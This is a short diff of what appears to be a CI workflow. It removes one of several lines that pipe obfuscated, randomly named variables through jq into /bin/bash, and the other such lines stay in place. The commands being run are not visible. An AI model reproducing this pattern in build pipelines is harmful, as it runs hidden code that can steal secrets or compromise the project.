@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$rga63" | jq -r .ql94 | /bin/bash
           echo $htqsg407 | jq -r .gsc69 | /bin/bash
           echo $mx56 | jq -r .oql766 | /bin/bash
-          echo $h72 | jq -r .c7140 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
